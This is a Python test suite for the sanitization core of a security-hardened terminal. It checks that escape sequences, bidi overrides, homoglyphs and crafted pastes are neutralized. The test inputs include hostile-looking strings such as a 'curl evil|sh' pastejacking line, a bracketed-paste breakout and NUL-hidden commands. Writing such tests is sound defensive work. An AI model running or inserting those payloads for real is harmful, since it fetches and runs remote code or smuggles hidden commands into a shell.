#!/usr/bin/python3 -Bsu

## Copyright (C) 2026 - 2026 ENCRYPTED SUPPORT LLC <adrelanos@whonix.org>
## See the file COPYING for copying conditions.

## AI-Assisted

"""
Test secure-terminal's pure sanitization core (secure_terminal.sanitize) and a
static HTML-safety property of the widget layer. The core is GUI-free, so it is
exercised directly with no PyQt6. Exit 0 on full pass, 1 on any failure, 77
(SKIP) when the module cannot be imported.

Source here is pure ASCII: codepoints are numbers and strings are built with
chr()/escape sequences, never raw non-ASCII bytes.
"""

import os
import sys

try:
    from secure_terminal import sanitize as S
except Exception as exc:  # pylint: disable=broad-except
    # Fail CLOSED, like test_corpus / test_fuzz / test_widget / test_fuzz_harnesses.
    # This was exit 77, which dist-ai-tests-all reports as SKIP and counted green --
    # so a broken secure_terminal.sanitize import made the LARGEST sanitization suite
    # in the tree report success while asserting nothing.
    sys.stderr.write('secure-terminal-tests: FAIL cannot import '
                     'secure_terminal.sanitize: %s\n' % exc)
    sys.exit(1)

PASS = 0
FAIL = 0


def ok(cond, msg):
    global PASS, FAIL
    if cond:
        PASS += 1
    else:
        FAIL += 1
        sys.stderr.write('FAIL: ' + msg + '\n')


def eq(got, want, msg):
    ok(got == want, '%s -> %r, want %r' % (msg, got, want))


# --- render_output: box (safe) -------------------------------------
CAFE = 'caf' + chr(0x00E9)                       # e-acute
CJK = chr(0x4E2D)
EMOJI = chr(0x1F600)
BIDI = chr(0x202E)                               # right-to-left override
ZWSP = chr(0x200B)                               # zero-width space
NBSP = chr(0x00A0)                               # no-break space
BEL = chr(0x07)
NUL = chr(0x00)

eq(S.render_output('plain ascii\t\n', 'box'), 'plain ascii\t\n', 'box keeps ascii+tab+nl')
eq(S.render_output(CAFE, 'box'), 'caf_', 'box replaces non-ascii with _')
eq(S.render_output('a' + BIDI + 'b', 'box'), 'a_b', 'box bidi')
eq(S.render_output('a' + ZWSP + 'b', 'box'), 'a_b', 'box zero-width')
eq(S.render_output('a' + NBSP + 'b', 'box'), 'a_b', 'box nbsp')
eq(S.render_output('a' + NUL + chr(0x1F) + 'b', 'box'), 'a__b', 'box control -> _')
# a standalone BEL is a bell SIGNAL, not display content -> dropped from the
# display in every mode, while has_bell still detects it so the bell policy rings.
eq(S.render_output('a' + BEL + 'b', 'box'), 'ab', 'box drops a standalone BEL')
ok(S.has_bell('a' + BEL + 'b'), 'has_bell still detects a dropped BEL')

# --- render_output: show (render legit unicode, still neutralize deceptive) ----
eq(S.render_output(CAFE, 'show'), CAFE, 'show renders e-acute')
eq(S.render_output(CJK + EMOJI, 'show'), CJK + EMOJI, 'show renders cjk+emoji')
eq(S.render_output('a' + BIDI + 'b', 'show'), 'a_b', 'show still neutralizes bidi')
eq(S.render_output('a' + ZWSP + 'b', 'show'), 'a_b', 'show still neutralizes zero-width')
eq(S.render_output('a' + NBSP + 'b', 'show'), 'a_b', 'show still neutralizes nbsp')
eq(S.render_output('a' + NUL + 'b', 'show'), 'a_b', 'show still neutralizes control')

# --- render_output: reveal ----------------------------------------------------
eq(S.render_output(CAFE, 'reveal'), 'caf<U+00E9>', 'reveal e-acute')
eq(S.render_output('a' + BIDI + 'b', 'reveal'), 'a<U+202E>b', 'reveal bidi')
eq(S.render_output('a' + NUL + 'b', 'reveal'), 'a<U+0000>b', 'reveal control')
eq(S.render_output('a' + BEL + 'b', 'reveal'), 'ab', 'reveal drops a standalone BEL')
eq(S.render_output(EMOJI, 'reveal'), '<U+1F600>', 'reveal astral')

# --- render_output: detail (reveal badge + the Unicode name inline) -----------
eq(S.render_output(CAFE, 'detail'),
   'caf<U+00E9 LATIN SMALL LETTER E WITH ACUTE>', 'detail names e-acute')
eq(S.render_output('a' + BIDI + 'b', 'detail'),
   'a<U+202E RIGHT-TO-LEFT OVERRIDE>b', 'detail names the bidi override')
eq(S.render_output(EMOJI, 'detail'), '<U+1F600 GRINNING FACE>', 'detail names astral')
ok(all(0x20 <= ord(c) <= 0x7E for c in S.render_output(CAFE + BIDI + EMOJI, 'detail')),
   'detail badge is plain ASCII (safe in every display)')

# --- colored markings: risk class of a neutralized/revealed character ---------
eq(S.marking_class(0x202E), 'bidi', 'RLO is bidi')
eq(S.marking_class(0x200B), 'invisible', 'ZWSP is invisible')
eq(S.marking_class(0x07), 'control', 'BEL is control')
eq(S.marking_class(0x00E9), 'nonascii', 'e-acute is nonascii')
# confusables: a non-ASCII code point that is a LOOK-ALIKE of a printable ASCII
# character (a homoglyph) is its own risk class, louder than honest foreign text.
eq(S.marking_class(0x0430), 'confusable', 'Cyrillic small a (look-alike of Latin a) is confusable')
eq(S.marking_class(0x03BF), 'confusable', 'Greek small omicron (look-alike of o) is confusable')
eq(S.marking_class(0x4E2D), 'nonascii', 'CJK zhong is foreign, not an ASCII look-alike')
eq(S.marking_class(0x00E9), 'nonascii', 'e-acute is foreign, not an ASCII look-alike')
ok(len(S._ascii_confusables()) > 500,
   'the Unicode confusables set is populated (%d code points)' % len(S._ascii_confusables()))
ok(all(cp > 0x7F for cp in S._ascii_confusables()),
   'the confusables set holds only non-ASCII sources (ASCII is never flagged as a look-alike of itself)')
# if the confusables data cannot be loaded the lazy loader must degrade to an
# empty set (a look-alike then just stays generic 'nonascii'), never crash: force
# the load to raise and confirm the defensive except yields an empty frozenset.
_saved_conf = S._ASCII_CONFUSABLES
try:
    S._ASCII_CONFUSABLES = None


    def _conf_load_boom(*_a, **_k):
        raise OSError('forced confusables load failure')

    S.open = _conf_load_boom             # shadow the module's open() -> load fails
    _degraded = S._ascii_confusables()
    ok(_degraded == frozenset(),
       'the confusables loader degrades to an empty set when the data cannot be read')
finally:
    del S.open
    S._ASCII_CONFUSABLES = _saved_conf
_mk = [(chr(0x202E), ())]
_runs, _ = S.cells_to_runs([], _mk, 'reveal', False, True)
ok(any(k == (S.MARK_KEY, 'bidi', 0x202E) for _t, k in _runs),
   'a bidi badge is tagged (MARK_KEY, bidi, codepoint) for colour + inspection')
_runs_off, _ = S.cells_to_runs([], _mk, 'reveal', False, False)
# markings off: still tagged with the codepoint (so hover/click works), but the
# colour CLASS slot is None so nothing is coloured.
_moff = [k for _t, k in _runs_off if isinstance(k, tuple) and k and k[0] == S.MARK_KEY]
ok(_moff and all(k[1] is None and k[2] == 0x202E for k in _moff),
   'markings off + colours off: codepoint tagged, no colour source')
# markings off but ANSI colours ON: the marking keeps the PROGRAM's own SGR as its
# colour source, so disabling risk-class colouring never drops allowed ANSI colour.
_sgr = tuple(sorted({'fg': 1, 'bg': None, 'bold': False}.items()))
_runs_sgr, _ = S.cells_to_runs([], [(chr(0x202E), _sgr)], 'box', True, False)
_msgr = [k for _t, k in _runs_sgr if isinstance(k, tuple) and k and k[0] == S.MARK_KEY]
ok(_msgr and _msgr[0] == (S.MARK_KEY, _sgr, 0x202E),
   'markings off + colours on: the marking carries the program SGR as its colour')
# the run TEXT is identical either way -- colouring never changes what is shown
eq(''.join(t for t, _ in _runs), ''.join(t for t, _ in _runs_off),
   'colored markings change only the colour, never the safe text')
# a flood of alternating safe/marking chars must NOT explode into one run each
# (that would be one Qt insert per char and wedge the UI): the runs are capped.
_flood = [('a' if i % 2 else chr(0x202E), ()) for i in range(20000)]
_fr, _ = S.cells_to_runs([], _flood, 'box', False, True)
ok(len(_fr) <= 2100,
   'marking runs are capped so a flood cannot defeat run-coalescing (%d runs)' % len(_fr))

# --- Show mode: render the real glyph but TINT it by risk class ----------------
# In show mode a non-ASCII glyph is shown as itself (not boxed/escaped), yet it is
# still tagged with its risk class so colour flags a homoglyph the eye cannot catch.
_sh_conf, _ = S.cells_to_runs([], [(chr(0x0430), ())], 'show', False, True)
ok(any(k == (S.MARK_KEY, 'confusable', 0x0430) for _t, k in _sh_conf),
   'show mode tags a homoglyph glyph with its confusable risk colour')
eq(''.join(t for t, _ in _sh_conf), chr(0x0430),
   'show mode still renders the actual glyph (tinted, not replaced by a box)')
_sh_cjk, _ = S.cells_to_runs([], [(chr(0x4E2D), ())], 'show', False, True)
ok(any(isinstance(k, tuple) and k[:2] == (S.MARK_KEY, 'nonascii') for _t, k in _sh_cjk),
   'show mode tags an honest foreign glyph with the milder non-ASCII colour')
_sh_ascii, _ = S.cells_to_runs([], [('a', ())], 'show', False, True)
ok(all(not (isinstance(k, tuple) and k and k[0] == S.MARK_KEY) for _t, k in _sh_ascii),
   'show mode leaves a plain ASCII char untagged (nothing to flag)')
# markings off: the glyph is still tagged for hover/inspection, but its colour slot
# is None, so nothing is tinted (turning off risk colours really removes the tint).
_sh_off, _ = S.cells_to_runs([], [(chr(0x0430), ())], 'show', False, False)
_soff = [k for _t, k in _sh_off if isinstance(k, tuple) and k and k[0] == S.MARK_KEY]
ok(_soff and all(k[1] is None and k[2] == 0x0430 for k in _soff),
   'show mode with markings off tints nothing (codepoint tagged, no colour source)')

# --- Show mode is consistent with Box for no-glyph characters ------------------
# A character with no visible glyph (zero-width, bidi override, control) cannot be
# "shown", so Show falls back to the SAME box placeholder Box mode uses -- tinted by
# risk class -- rather than a bare '_'. Only a printable glyph is rendered as itself.
for _cp, _cls in ((0x200B, 'invisible'), (0x202E, 'bidi'), (0x009F, 'control')):
    _r, _ = S.cells_to_runs([], [(chr(_cp), ())], 'show', False, True)
    eq(''.join(t for t, _ in _r), S.BOX,
       'show draws a no-glyph char (U+%04X) as the box, like Box mode' % _cp)
    ok(any(k == (S.MARK_KEY, _cls, _cp) for _t, k in _r),
       'the show-mode box for U+%04X is tinted its risk class (%s)' % (_cp, _cls))
# the box for a no-glyph char is identical between Box and Show mode (consistency).
_box_r, _ = S.cells_to_runs([], [(chr(0x202E), ())], 'box', False, True)
eq(''.join(t for t, _ in _box_r), ''.join(t for t, _ in
   S.cells_to_runs([], [(chr(0x202E), ())], 'show', False, True)[0]),
   'a bidi override renders identically in Box and Show mode')
# a literal ASCII underscore is never turned into a box in either mode.
_us, _ = S.cells_to_runs([], [('_', ())], 'show', False, True)
eq(''.join(t for t, _ in _us), '_', 'a real ASCII underscore stays an underscore, not a box')

# --- deferred autowrap (VT last-column behaviour) + wrap flags -----------------
_wc, _wcells, _wcol, _ws, _ww = S.feed_line_edits([], 0, {}, 'abcd\n', 4)
eq(len(_wc), 1, 'exactly-width output + newline is one line, no spurious blank wrap')
eq(_ww, [False], 'a newline-terminated line is not flagged a wrap')
_wc2, _wcells2, _wcol2, _ws2, _ww2 = S.feed_line_edits([], 0, {}, 'abcde', 4)
eq(len(_wc2), 1, 'the 5th char on a width-4 line wraps to a fresh row')
eq(_ww2, [True], 'the wrap is flagged so copy can join the rows')
eq([ch for ch, _ in _wcells2], ['e'], 'the wrapping char starts the new row')
_wc3, _wcells3, _wcol3, _ws3, _ww3 = S.feed_line_edits([], 0, {}, 'abcd\rX', 4)
eq(len(_wc3), 0, 'a carriage return after the last column cancels the pending wrap')
eq(_wcells3[0][0], 'X', 'the CR returns to column 0 and overwrites, no new row')
# a cursor/erase CSI op likewise clears the pending wrap: at width 4 the erase
# after the last column leaves the cursor there, so X overwrites (abcX), not wraps
_wc4, _wcells4, _wcol4, _ws4, _ww4 = S.feed_line_edits([], 0, {}, 'abcd\x1b[KX', 4)
eq(len(_wc4), 0, 'an erase op after the last column cancels the pending wrap')
eq([ch for ch, _ in _wcells4], ['a', 'b', 'c', 'X'],
   'the erase clears the pending wrap so X overwrites the last cell (abcX)')
# CSI 1K erases from the start of the line up to (and including) the cursor: after
# 'abcde' move the cursor to column 2 (CSI 3G) then erase-to-BOL -> "   de".
_e1c, _e1cells, _e1col, _e1s, _e1w = S.feed_line_edits([], 0, {}, 'abcde\x1b[3G\x1b[1K', 80)
eq(''.join(ch for ch, _ in _e1cells), '   de',
   'CSI 1K (erase to beginning of line) blanks cells from BOL to the cursor')
# SGR 39 / 49 reset the foreground / background to the terminal default (None)
_sgr = {'fg': 3, 'bg': 4}
S.parse_sgr('39', _sgr)
eq(_sgr['fg'], None, 'SGR 39 resets the foreground to default')
S.parse_sgr('49', _sgr)
eq(_sgr['bg'], None, 'SGR 49 resets the background to default')
S.parse_sgr('101', _sgr)
eq(_sgr['bg'], 9, 'SGR 100-107 selects a bright background colour (101 -> index 9)')

# --- cursor-forward pads blanks (a right-prompt jumps to the right edge) -------
# "\x1b[20C" from column 10 moves to column 30 (forward is RELATIVE), leaving a
# 20-blank GAP, not collapsing onto the last cell -- that was zsh's RPROMPT
# ([pts/N]) rendering inline after the prompt.
_pc, _pcells, _pcol, _ps, _pw = S.feed_line_edits([], 0, {}, '0123456789\x1b[20C[R]', 80)
_pline = ''.join(ch for ch, _ in _pcells)
eq(_pline, '0123456789' + ' ' * 20 + '[R]',
   'cursor-forward pads blanks so a right-prompt lands at its column, not inline')
eq(_pcol, 33, 'the cursor column tracks the padded position (10 + 20 + 3)')
# forward is still bounded by the width (no runaway padding)
_bc, _bcells, _bcol, _bs, _bw = S.feed_line_edits([], 0, {}, 'x\x1b[999C', 20)
eq(len(_bcells), 19, 'cursor-forward padding is clamped to the width (max_line-1)')
# absolute column (CSI G) pads the same way
_gc, _gcells, _gcol, _gs, _gw = S.feed_line_edits([], 0, {}, 'ab\x1b[6GZ', 80)
eq(''.join(ch for ch, _ in _gcells), 'ab   Z', 'CSI G pads to the absolute column')

# --- split-across-reads escape carry (a long OSC title is the usual victim) ----
# A whole OSC title is stripped; split across two chunks, the tail must NOT leak.
eq(S.split_trailing_escape('X\x1b]2;a title\x07'), ('X\x1b]2;a title\x07', ''),
   'a COMPLETE OSC (BEL-terminated) is not held back')
eq(S.split_trailing_escape('X\x1b]2;a ti'), ('X', '\x1b]2;a ti'),
   'an INCOMPLETE OSC tail is split off to carry to the next chunk')
eq(S.split_trailing_escape('a\x1b[38;5'), ('a', '\x1b[38;5'),
   'an incomplete CSI (no final byte) is carried')
eq(S.split_trailing_escape('a\x1b[0m'), ('a\x1b[0m', ''),
   'a complete CSI (has its final byte) is not carried')
eq(S.split_trailing_escape('done\x1b'), ('done', '\x1b'), 'a lone trailing ESC is carried')
# an ESC NOT at the end (a control byte follows it) is not a trailing carry: the
# regex anchors with \Z, not $, so a trailing newline after a stray ESC is kept,
# never dropped (a real data-loss bug when $ matched before the final newline).
eq(S.split_trailing_escape('\x1b\n'), ('\x1b\n', ''),
   'ESC followed by a newline carries nothing and never drops the newline')
eq(S.split_trailing_escape('x\x1b\ny'), ('x\x1b\ny', ''),
   'an ESC mid-text (newline after) is not treated as a trailing escape')
eq(S.split_trailing_escape('no escapes here'), ('no escapes here', ''),
   'plain text carries nothing')
eq(S.split_trailing_escape('\x1b]2;' + 'x' * 5000)[1], '',
   'an over-cap unterminated OSC is NOT held (bounded), it is let through')
# end-to-end: feeding the split halves with the carry reconstitutes and strips it
_carry = ''
def _feed_split(chunk):
    global _carry
    _t = _carry + chunk
    _t, _carry = S.split_trailing_escape(_t)
    return S.render_output(_t, 'box')
_leak = _feed_split('\x1b]2;host:~ (cd ~) [pt') + _feed_split('s/11]\x07[u]% ')
eq(_leak, '[u]% ', 'a split OSC title leaks nothing across the read boundary')

# --- DCS/SOS/PM/APC string sequences: strip the whole BODY, not just the opener -
# ESC P (DCS), ESC X (SOS), ESC ^ (PM), ESC _ (APC) carry a string body to a
# BEL/ST terminator. Matching only the 2-byte opener would leak the body as text,
# so a cat'd DECRQSS/XTGETTCAP/Sixel/kitty-graphics payload would show its guts.
eq(S.render_output('before\x1bP$qm\x1b\\after', 'box'), 'beforeafter',
   'DCS DECRQSS body stripped (no "$qm" leak)')
eq(S.render_output('a\x1bP+q544e\x1b\\b', 'box'), 'ab', 'DCS XTGETTCAP body stripped')
eq(S.render_output('a\x1bPq#0;2;0;0;0#0~~\x1b\\b', 'box'), 'ab', 'DCS Sixel body stripped')
eq(S.render_output('a\x1bXstart of string\x1b\\b', 'box'), 'ab', 'SOS body stripped')
eq(S.render_output('a\x1b^privmsg\x1b\\b', 'box'), 'ab', 'PM body stripped')
eq(S.render_output('a\x1b_Gf=100;payload\x1b\\b', 'box'), 'ab', 'APC kitty-graphics body stripped')
eq(S.render_output('x\x1bPbody\x1b\\y', 'box'), 'xy', 'DCS (ST-terminated) stripped')
# BEL does NOT terminate a DCS/SOS/PM/APC (only OSC): a BEL is body, so a string
# sequence continues past it to its ST -- else its continuation leaks as text.
eq(S.render_output('\x1bPsecret\x07LEAK\x1b\\after', 'box'), 'after',
   'a BEL inside a DCS is body, not a terminator (no "LEAK")')
eq(S.render_output('a\x1b]0;title\x07b', 'box'), 'ab', 'OSC still terminates on BEL')
# an unterminated DCS swallows to end-of-input (no ST ever arrives)
eq(S.render_output('keep\x1bPneverending tail', 'box'), 'keep',
   'an unterminated DCS swallows the rest of the chunk')
# a DCS/APC split across two reads must carry its tail, not leak it
eq(S.split_trailing_escape('log\x1bP$q'), ('log', '\x1bP$q'), 'an incomplete DCS tail is carried')
eq(S.split_trailing_escape('log\x1b_Gf=1'), ('log', '\x1b_Gf=1'), 'an incomplete APC tail is carried')
eq(S.split_trailing_escape('log\x1bP$qm\x1b\\'), ('log\x1bP$qm\x1b\\', ''),
   'a COMPLETE DCS (ST-terminated) is not held back')
# has_bell: a DCS/OSC-terminating BEL is not a bell; a standalone BEL is
ok(not S.has_bell('\x1bPabc\x07'), 'a DCS-internal BEL is not a standalone bell')
ok(not S.has_bell('\x1b]2;t\x07'), 'an OSC-terminating BEL is not a standalone bell')

# --- feed_chunk_carry: an over-long, chunk-split string sequence never leaks ---
# The core "cat anything safely" guarantee must hold for a sequence of ANY length
# even when it splits across read() chunks -- a large Sixel image is the worst
# case. Past the carry cap the feed switches to a discard state (O(1) memory).
def _fcc(chunks):
    carry, drop, out = '', '', ''
    for _c in chunks:
        _t, carry, drop = S.feed_chunk_carry(_c, carry, drop)
        out += S.render_output(_t, 'box')
    return out, carry, drop
eq(_fcc(['\x1bP' + 'A' * 5000, 'B' * 30 + '\x1b\\AFTER'])[0], 'AFTER',
   'a >cap DCS split across reads is fully stripped, its continuation not leaked')
eq(_fcc(['\x1b]2;' + 'x' * 5000, 'y' * 20 + '\x07TAIL'])[0], 'TAIL',
   'a >cap OSC split across reads is fully stripped (not the old bounded leak)')
eq(_fcc(['\x1bP' + 'A' * 5000, 'B' * 10 + '\x1b', '\\DONE'])[0], 'DONE',
   'an ST terminator itself split across the boundary is still recognised')
_mc = _fcc(['\x1bP' + 'A' * 5000] + ['A' * 4000] * 3 + ['tail\x1b\\OK'])
eq((_mc[0], _mc[2]), ('OK', ''), 'a discard spanning many chunks resumes after the ST')
# short split escapes still round-trip through feed_chunk_carry (regression)
eq(_fcc(['pre\x1b]2;a ti', 'tle\x07post'])[0], 'prepost', 'a short split OSC leaks nothing')
eq(_fcc(['a\x1b[38;5', ';2mb'])[0], 'ab', 'a short split CSI leaks nothing')
ok(S.has_bell('ding\x07'), 'a standalone BEL is a bell')

# --- OSC feature registry: single source of truth for the granular controls ---
_osc_keys = [f[0] for f in S.OSC_FEATURES]
ok(len(_osc_keys) == len(set(_osc_keys)), 'OSC feature keys are unique')
ok(all(k.startswith('osc_') for k in _osc_keys), 'OSC feature keys are namespaced osc_')
ok(all(f[3] is False for f in S.OSC_FEATURES),
   'every OSC feature is neutralized (off) by default -- secure by construction')
ok(all(f[4] in ('low', 'medium', 'high') for f in S.OSC_FEATURES),
   'OSC risk levels are valid (drive the security lamp)')
ok(all(f[2] and f[5] for f in S.OSC_FEATURES),
   'every OSC feature has its codes and a layman attack-surface hint')
eq(set(S.OSC_FEATURE_BY_KEY), set(_osc_keys), 'the by-key lookup matches the registry')
# clipboard read and write are the high-risk ones
ok(S.OSC_FEATURE_BY_KEY['osc_clipboard'][3] == 'high'
   and S.OSC_FEATURE_BY_KEY['osc_clipboard_read'][3] == 'high',
   'clipboard read and write are flagged high risk')
# iTerm2 (OSC 1337) is NOT a registered feature -- it can never be enabled
ok('osc_iterm2' not in S.OSC_FEATURE_BY_KEY,
   'iTerm2 file-transfer escapes have no toggle (always neutralized)')

# --- escapes are always stripped; editing controls always pass ----------------
ESC = '\x1b[31mRED\x1b[0m'
for mode in ('box', 'show', 'reveal', 'detail'):
    eq(S.render_output(ESC, mode), 'RED', 'escape stripped in %s' % mode)
    eq(S.render_output('ab\x08\r\t\nX', mode), 'ab\x08\r\t\nX',
       'editing controls pass in %s' % mode)

# CSI with a private-parameter prefix (< = > ?) -- a capable-TERM program emits
# these (modifyOtherKeys "\x1b[>4;2m", cursor hide "\x1b[?25l") -- must strip whole
eq(S.render_output('a\x1b[>4;2mb', 'box'), 'ab', 'box CSI private > param')
eq(S.render_output('a\x1b[?25lb', 'box'), 'ab', 'box CSI private ? param')
eq(S.render_output('a\x1b[=3hb', 'box'), 'ab', 'box CSI private = param')
# CSI cursor moves, OSC hyperlink and bare escapes all vanish
eq(S.render_output('a\x1b[2Jb', 'box'), 'ab', 'box CSI clear')
eq(S.render_output('a\x1b]8;;http://evil\x07b', 'box'), 'ab', 'box OSC link')

# --- describe_codepoint: the reveal-badge tooltip -----------------------------
_euro = S.describe_codepoint(0x20AC)
ok('U+20AC' in _euro and 'EURO SIGN' in _euro and 'Currency Symbol' in _euro
   and '\\u20ac' in _euro, 'describe_codepoint: euro name+category+escape')
ok('RIGHT-TO-LEFT OVERRIDE' in S.describe_codepoint(0x202E), 'describe: bidi name')
ok('\\U0001f600' in S.describe_codepoint(0x1F600), 'describe: astral uses \\U escape')
ok('not a code point' in S.describe_codepoint(0x110000), 'describe: out-of-range guarded')
ok('unnamed' in S.describe_codepoint(0x07), 'describe: unnamed control still described')

# --- full-screen (alternate screen) detection ---------------------------------
ok(S.wants_full_screen('\x1b[?1049h') is True, 'detects alt-screen enter (1049)')
ok(S.wants_full_screen('\x1b[?47h') is True, 'detects alt-screen enter (47)')
ok(S.wants_full_screen('plain text') is False, 'no false positive on plain text')
ok(S.leaves_full_screen('\x1b[?1049l') is True, 'detects alt-screen leave (1049)')
ok(S.leaves_full_screen('\x1b[?1049h') is False, 'enter is not a leave')

# --- in-place repaint detection (zsh/readline menu, progress grid, no alt screen)
# The tell line mode cannot draw: cursor-up to repaint above, or absolute row;col
# addressing. This is what an interactive completion menu emits, and it uses no
# alternate screen, so wants_full_screen misses it (the reported bug).
ok(S.wants_screen_repaint('list\n\x1b[2A\x1b[7msel\x1b[27m') is True,
   'detects a completion menu repaint (cursor-up), which alt-screen detection misses')
ok(S.wants_screen_repaint('\x1b[A') is True, 'detects a bare cursor-up (CUU)')
ok(S.wants_screen_repaint('\x1b[5;10Hx') is True, 'detects absolute cell addressing (row;col)')
# no false positives on things line mode renders fine or drops harmlessly:
ok(S.wants_screen_repaint('busy... 42%\rbusy... 43%') is False,
   'a single-line \\r progress bar is not flagged (line mode draws it fine)')
ok(S.wants_screen_repaint('\x1b[H\x1b[2J') is False,
   'clear/reset (home + erase-display, no cursor-up, no row;col) is not flagged')
ok(S.wants_screen_repaint('\x1b[3C\x1b[K') is False,
   'horizontal moves (CUF) and erase-line (EL), which line mode renders, are not flagged')
ok(S.wants_screen_repaint('plain output text') is False, 'plain text is not flagged')
# wants_line_clears: a curses app under the restricted terminfo cannot cursor-address,
# so it clears the screen with a BURST of EL -- the tell wants_screen_repaint misses
# (nano). A shell's one/two-EL prompt stays below the threshold (#94).
ok(S.wants_line_clears('\x1b[K' * 4) is True, 'a burst of EL is flagged (curses redraw)')
ok(S.wants_line_clears('\x1b[2K\x1b[1K\x1b[K\x1b[K') is True, 'EL variants count toward the burst')
ok(S.wants_line_clears('prompt$ \x1b[K') is False, 'a single EL (a prompt) is not flagged')
ok(S.wants_line_clears('plain output') is False, 'no EL -> not flagged')

# _printable_follows: bash emits the bracketed-paste marker BEFORE its prompt text
# (printable follows -> True); zsh emits it AFTER, with only escapes/controls left
# (nothing printable follows -> False). Deterministic here (the pty-timed prompt
# test is flaky), so the zsh no-printable-follows branch is always exercised.
ok(S._printable_follows('\x1b[?2004l\x1b[Kuser@host$ ', 0) is True,
   '_printable_follows: True when printable prompt text still follows (bash)')
ok(S._printable_follows('\x1b[?2004h\x1b[K\x07', 0) is False,
   '_printable_follows: False when only escapes/controls follow (zsh)')

# bidi controls (Trojan-Source): no display mode may emit a RAW bidi char (which
# would reorder the line); detail and reveal surface the codepoint inline so a
# hidden override is named, not silently reordered.
for _bcp in (0x202E, 0x2066, 0x202D, 0x2069, 0x200F):
    _bsrc = 'a' + chr(_bcp) + 'b'
    for _bmode in ('box', 'show', 'reveal', 'detail'):
        ok(chr(_bcp) not in S.render_output(_bsrc, _bmode),
           'bidi: %s never emits a raw U+%04X to the document' % (_bmode, _bcp))
    ok(('U+%04X' % _bcp) in S.render_output(_bsrc, 'detail'),
       'bidi: detail surfaces U+%04X inline' % _bcp)
    ok(('U+%04X' % _bcp) in S.render_output(_bsrc, 'reveal'),
       'bidi: reveal surfaces U+%04X inline' % _bcp)

# --- whole-screen clear / reset detection (a no-op in append-only line mode) ---
ok(S.wants_clear('\x1b[2J') is True, 'detects a whole-screen clear (ED2)')
ok(S.wants_clear('\x1b[3J') is True, 'detects a scrollback clear (ED3)')
ok(S.wants_clear('\x1bc') is True, 'detects a full terminal reset (RIS)')
ok(S.wants_clear('\x1b[H\x1b[2J') is True, 'detects the classic `clear` (home + ED2)')
# ED0/ED1 (erase from the cursor) are ordinary line-editing, NOT a screen clear:
ok(S.wants_clear('\x1b[J') is False, 'ED0 (erase to end) is not a screen clear')
ok(S.wants_clear('\x1b[1J') is False, 'ED1 (erase to start) is not a screen clear')
ok(S.wants_clear('\x1b[K') is False, 'EL (erase line) is not a screen clear')
ok(S.wants_clear('plain output text') is False, 'plain text is not a clear')

# --- sanitize_bytes / sanitize_paste ------------------------------------------
eq(S.sanitize_bytes(b'a\x08 \x08', 'box'), 'a\x08 \x08', 'sanitize_bytes keeps bs/space')
eq(S.sanitize_paste('a\nb\r\tc'), 'a\rb\r\tc', 'paste nl/cr -> cr, tab kept')
eq(S.sanitize_paste('ex' + chr(0x0430) + 'mple.org'), 'exmple.org', 'paste strips cyrillic homoglyph')
eq(S.sanitize_paste('x' + BIDI + ZWSP + 'y'), 'xy', 'paste strips bidi+zw')

# --- crafted paste cannot smuggle HIDDEN code / escapes into the shell --------
# The class of attack: a paste that carries an escape (to be reflected back as
# input), a bracketed-paste-end sequence (to break the shell's paste guard and
# inject), a C1 control, or a hidden line -- so that something you did NOT see
# runs. sanitize_paste (what actually reaches the pty) must leave only visible
# ASCII plus CR/TAB, so nothing hidden can execute.
def _visible_only(text):
    return all(ch in '\r\t' or 0x20 <= ord(ch) <= 0x7E for ch in text)
for _payload, _why in (
    ('ls\x1b]0;evil\x07 -la',          'OSC title-set (reflection bait)'),
    ('safe\x1b[201~unsafe',            'bracketed-paste-end breakout (CSI 201~)'),
    ('x\x1bP0;1q\x1b\\y',              'DCS sequence'),
    ('a\x9bBc',                        'C1 CSI (0x9b)'),
    ('cmd\x00; hidden',                'NUL as a hidden separator'),
    ('t' + chr(0x0430) + chr(0x200B),  'homoglyph + zero-width'),
):
    _s = S.sanitize_paste(_payload)
    ok(_visible_only(_s), 'crafted paste (%s) -> only visible ASCII reaches the shell' % _why)
    ok('\x1b' not in _s and '\x9b' not in _s,
       'crafted paste (%s) -> no ESC / C1 survives to inject' % _why)
# The honest LIMIT (see the /comparison behaviour section): a plain multi-line or
# chained paste is VISIBLE, not hidden -- it submits, and no terminal treats that
# as deception. The guard is against hidden smuggling, not against a command you
# can read.
eq(S.sanitize_paste('ls\necho x'), 'ls\recho x',
   'a plain multi-line paste submits both VISIBLE lines (the limit, not a bug)')

# --- paste_findings -----------------------------------------------------------
eq(S.paste_findings('plain ascii\n\t'), (False, False), 'findings clean')
eq(S.paste_findings(CAFE), (True, False), 'findings unicode')
eq(S.paste_findings('a' + BEL + 'b'), (False, True), 'findings control')
eq(S.paste_findings('a' + BIDI + NUL), (True, True), 'findings both')

# --- paste_is_multiline (F3): a multi-line paste is held for review even when pure
# ASCII, so a hidden second command cannot run the instant you paste ---------------
eq(S.paste_is_multiline(''), False, 'multiline: empty is not multi-line')
eq(S.paste_is_multiline('ls'), False, 'multiline: a single line is not multi-line')
eq(S.paste_is_multiline('ls\n'), False,
   'multiline: a single line with a trailing newline is one command, not multi-line')
eq(S.paste_is_multiline('a\nb'), True, 'multiline: two lines are multi-line')
eq(S.paste_is_multiline('echo ok\rcurl evil|sh'), True,
   'multiline: an interior carriage return (which the shell runs) is multi-line')
eq(S.paste_is_multiline('echo ok\ncurl evil|sh\n'), True,
   'multiline: a pastejacking payload is multi-line (held for review)')

# --- colours: environment gate (NO_COLOR only, NOT the launch TERM) -----------
saved_env = {k: os.environ.get(k) for k in ('NO_COLOR', 'TERM', 'COLORTERM')}
try:
    os.environ.pop('NO_COLOR', None)
    os.environ['TERM'] = 'xterm'
    ok(S.colors_allowed() is True, 'colors allowed on xterm w/o NO_COLOR')
    os.environ['NO_COLOR'] = '1'
    ok(S.colors_allowed() is False, 'NO_COLOR forces off')
    os.environ['NO_COLOR'] = ''       # spec: an EMPTY NO_COLOR does not disable
    ok(S.colors_allowed() is True, 'empty NO_COLOR does not force off')
    os.environ.pop('NO_COLOR', None)
    os.environ['TERM'] = 'dumb'
    # a dumb LAUNCH TERM must NOT disable colours: the terminal renders to a
    # screen, not to its parent (regression: launched from a line-mode terminal)
    ok(S.colors_allowed() is True, 'a dumb launch TERM does not force colours off')
finally:
    for key, value in saved_env.items():
        if value is None:
            os.environ.pop(key, None)
        else:
            os.environ[key] = value

# --- colours: contrast guard (luminance) --------------------------------------
BLACK = (0, 0, 0)
DARK_BG = (0x14, 0x16, 0x1b)
RED = (0xcd, 0, 0)
GREEN = (0, 0xcd, 0)
WHITE = (0xff, 0xff, 0xff)
ok(S.too_close(BLACK, BLACK) is True, 'black vs black too close')
